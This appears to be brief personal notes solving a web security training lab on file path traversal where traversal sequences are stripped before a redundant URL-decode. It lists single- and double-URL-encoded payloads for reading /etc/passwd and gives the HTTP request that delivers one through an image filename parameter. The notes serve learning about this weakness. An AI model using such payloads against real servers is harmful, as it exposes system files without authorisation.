# File path traversal, traversal sequences stripped with superfluous URL-decode

## This lab contains a [file path traversal]() vulnerability in the display of product images.

## The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

## To solve the lab, retrieve the contents of the `/etc/passwd` file.

../../../etc/passwd ==> ..%2F..%2F..%2Fetc%2Fpasswd

..%252F..%252F..%252Fetc%252Fpasswd //ctrl +u

../../../etc/passwd ==> %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd // ctrl + u

### step1

GET /image?filename=16.jpg HTTP/1.1

### step2

GET /image?filename=..%252F..%252F..%252Fetc%252Fpasswd

test in repeater once successfull try on main intercept url
